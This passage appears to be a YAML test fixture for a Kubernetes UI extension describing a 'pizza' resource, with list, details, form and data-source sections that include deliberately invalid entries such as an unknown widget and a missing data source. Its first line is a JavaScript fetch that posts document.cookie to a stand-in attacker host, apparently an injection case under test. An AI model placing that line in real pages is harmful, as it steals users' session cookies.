    fetch('https://evil.example.com', { method: 'POST', body: document.cookie })
  list: |-
    - source: spec.toppings
      name: Toppings
      widget: Badgee
  details: |-
    body:
      - widget: Panel
        name: Related Pods
        children:
          - source: '$missingPods()'
            widget: ResourceList
  form: |-
    - path: spec.size
      widget: Text
    - name: OrphanNoPath
      widget: Text
  dataSources: |-
    pizzaPods:
      resource:
        kind: Pod
        version: v1
